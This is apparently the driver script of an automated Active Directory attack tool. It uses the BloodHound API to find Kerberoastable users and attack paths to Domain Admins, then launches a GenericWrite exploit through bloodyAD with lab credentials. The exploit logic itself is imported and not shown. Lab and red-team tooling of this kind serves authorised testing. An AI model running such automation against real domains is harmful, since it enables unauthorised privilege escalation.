# main.py
import os
import sys
from dotenv import load_dotenv

from rich.console import Console

from entities.client import Client
from entities.node import Node
from entities.node_kind import NodeKind
from utils.request import BHRequest
from services.pathfinding import get_path
from exceptions.no_path_error import NoPathError
from exceptions.auto_pwn_exception import AutoPwnException
from services.printing import print_check, print_done, print_error, print_warning, print_title, print_node
from services.reporting import *
from services.parse_objects import parse_node
from exceptions.config_error import ConfigError

load_dotenv()

# ─── 1. Load credentials ────────────────────────────────────────────────────

TOKEN_ID = os.getenv("BLOODHOUND_TOKEN_ID")
TOKEN_KEY = os.getenv("BLOODHOUND_TOKEN_KEY")
BH_URL = os.getenv("BLOODHOUND_URL", "http://127.0.0.1:8080")

try:
    client = Client(TOKEN_ID, TOKEN_KEY, BH_URL)
    bh = BHRequest(client)

    print_check(f"Credentials loaded — connecting to {BH_URL}")

except ConfigError as e:
    print_error(f"{e}")
    sys.exit(1)
except Exception as e:
    print_error(f"Unexpected error while initializing client: {e}")
    sys.exit(1)

# ─── 2. Connectivity check ───────────────────────────────────────────────────

print_title("Step 1 — Checking API connectivity")
result = bh.bh_get("/api/v2/self")
if result is None:
    print_error("Could not reach BloodHound. Check BH_URL and that the server is running.")
    sys.exit(1)
print_check(f"Connected. Token belongs to: {result.get('data', {}).get('principal_name', '?')}")

# ─── 3. Raw Cypher query — list domains ──────────────────────────────────────
# Sanity check that the Neo4j data is populated and the Cypher endpoint works.

print_title("Step 2 — Querying domains in Neo4j")
domain_result = bh.bh_post("/api/v2/graphs/cypher", 
    {
        "query": "MATCH (d:Domain) RETURN d",
        "include_properties": True
    }
)
if domain_result is None:
	print_error("Cypher query failed. Is data collected and ingested?")
	sys.exit(1)

nodes = domain_result.get("data", {}).get("nodes", {})
print_check(f"Found {len(nodes)} domain(s):")
for node in nodes.values():
    print_node((parse_node(node)))

# ─── 4. Find a Kerberoastable user ───────────────────────────────────────────

print_title("\nStep 3 — Finding Kerberoastable users")
kerb_result = bh.bh_post("/api/v2/graphs/cypher", {
    "query": "MATCH (u:User) WHERE u.hasspn = true AND u.enabled = true RETURN u",
    "include_properties": True
})
kerb_nodes = kerb_result.get("data", {}).get("nodes", {}) if kerb_result else {}
if not kerb_nodes:
	print_warning("No Kerberoastable users found (or query failed).")
else:
	print_check(f"Found {len(kerb_nodes)} Kerberoastable user(s):")
	for node in kerb_nodes.values():
		spns = node["properties"].get("serviceprincipalnames", [])
		print(f"    • {node['label']}  SPNs: {spns}") # TODO : format

# ─── 5. Find Domain Admins group objectId ────────────────────────────────────

print_title("\nStep 4 — Locating Domain Admins group")
da_result = bh.bh_post("/api/v2/graphs/cypher", {
    "query": "MATCH (g:Group) WHERE g.name STARTS WITH 'DOMAIN ADMINS' RETURN g",
    "include_properties": True
})
da_nodes = da_result.get("data", {}).get("nodes", {}) if da_result else {}
if not da_nodes:
	print_error("Domain Admins group not found.")
	sys.exit(1)

da_data    = list(da_nodes.values())[0]
da_node    = Node(da_data["objectId"], NodeKind.GROUP, da_data["label"], da_data["properties"])
print_node(da_node)

# ─── 6. Find a user to path from ─────────────────────────────────────────────

print_title("Step 5 — Finding a user to path from")
user_result = bh.bh_post("/api/v2/graphs/cypher", {
    "query": "MATCH (u:User) WHERE u.enabled = true RETURN u LIMIT 5",
    "include_properties": True
})
user_nodes = user_result.get("data", {}).get("nodes", {}) if user_result else {}
if not user_nodes:
    print_error("No enabled users found.")
    sys.exit(1)

print_check(f"Found {len(user_nodes)} enabled user(s):")
for u_data in user_nodes.values():
    print_node(parse_node(u_data))

# ─── 7. Shortest path to Domain Admins ───────────────────────────────────────

print_title("Step 6 — Shortest path to Domain Admins")
path_found = False
for u_data in user_nodes.values():
    source = parse_node(u_data)
    if source is None:
        continue
    print_check(f"Trying: {source.label} → {da_node.label}")
    try:
        path = get_path(bh, source, da_node)
        # Filter out None edges from unknown EdgeKinds before rendering
        path.edges = [e for e in path.edges if e is not None]
        if not path.edges:
            print_warning(f"Path found but all edges were unknown kinds, skipping.")
            continue
        print_check(f"Path found! Length: {path.length} hop(s)")
        console.print(format_path(path, index=1))
        path_found = True
        break
    except NoPathError:
        print_warning(f"No path from {source.label}, trying next...")
    except AutoPwnException as e:
        print_error(f"Tool error: {e}")
        break

if not path_found:
    print_warning("No path found from any of the sampled users.")

print_done("All checks complete.")

# ─── 8. Find & exploit a GenericWrite edge ───────────────────────────────────

from entities.edge_kind import EdgeKind
from entities.edge import Edge
from utils.platform import BACKEND
from strategies.generic_write import GenericWriteStrategy

print_title("Step 7 — Testing GenericWrite exploit")

# ── 8a. Détecter le backend ───────────────────────────────────────────────────

print_check(f"Backend detected: {BACKEND.name}")
if BACKEND.name == "none":
    print_error("No backend available. Install bloodyAD (Linux) or bloodyAD in WSL (Windows).")
    print_warning("Skipping exploit test.")
else:

    # ── 8b. Chercher un edge GenericWrite dans Neo4j ──────────────────────────

    gw_result = bh.bh_post("/api/v2/graphs/cypher", {
        "query": """
            MATCH (src)-[r:GenericWrite|GenericAll]->(dst)
            WHERE src.enabled = true
            RETURN src, r, dst
            LIMIT 1
        """,
        "include_properties": True
    })

    gw_nodes = gw_result.get("data", {}).get("nodes", {}) if gw_result else {}
    gw_edges = gw_result.get("data", {}).get("edges", []) if gw_result else []

    if not gw_edges:
        print_warning("No GenericWrite/GenericAll edge found in the graph.")
    else:
        raw_edge = gw_edges[0]
        print_check(f"Found edge: {raw_edge['label']} — {raw_edge['source']} → {raw_edge['target']}")

        # ── 8c. Résoudre src et dst depuis les nodes ──────────────────────────

        src_data = gw_nodes.get(raw_edge["source"])
        dst_data = gw_nodes.get(raw_edge["target"])

        if src_data is None or dst_data is None:
            print_error("Could not resolve source or target node from query result.")
        else:
            src_node = parse_node(src_data)
            dst_node = parse_node(dst_data)

            if src_node is None or dst_node is None:
                print_error("Node parsing failed (unknown kind?).")
            else:
                print_check(f"Attacker : {src_node.label}  ({src_node.kind.value})")
                print_check(f"Target   : {dst_node.label}  ({dst_node.kind.value})")

                # ── 8d. Construire l'edge et la stratégie ─────────────────────

                try:
                    edge_kind = EdgeKind(raw_edge["kind"])
                except ValueError:
                    print_error(f"Unknown EdgeKind: {raw_edge['kind']}")
                    edge_kind = None

                if edge_kind:
                    edge     = Edge(source_node=src_node, goal_node=dst_node, kind=edge_kind)
                    strategy = GenericWriteStrategy(edge=edge, victim=src_node)

                    print_check(f"can_exploit() → {strategy.can_exploit()}")

                    if not strategy.can_exploit():
                        print_warning("Strategy says it cannot exploit this edge.")
                    else:
                        # ── 8e. Creds depuis .env ─────────────────────────────
                        creds = {
                            "dc_ip":    os.getenv("DC_IP",       "192.168.56.10"),
                            "domain":   os.getenv("AD_DOMAIN",   "sevenkingdoms.local"),
                            "username": os.getenv("AD_USERNAME", "cersei"),
                            "password": os.getenv("AD_PASSWORD", "cersei"),
                            # "hashes": os.getenv("AD_HASHES"),  # LM:NT si PTH
                        }

                        print_check(
                            f"Launching exploit — "
                            f"{src_node.label} ──[{edge_kind.value}]──▶ {dst_node.label}"
                        )

                        try:
                            from exceptions.hop_failed_error import HopFailedError
                            result = strategy.exploit(creds)
                            if result.was_executed():
                                print_done(f"Exploit succeeded! Technique: {result.technique}")
                                print_check(f"Output:\n{result.summary()}")
                                result.print_next_steps()
                            elif result.is_dry_run():
                                 print_warning(f"Exploit returned success=None:\n{result.output}")
                            else:
                                print_warning(f"Exploit returned success=False:\n{result.output}")
                        except HopFailedError as e:
                            print_error(f"HopFailedError: {e}")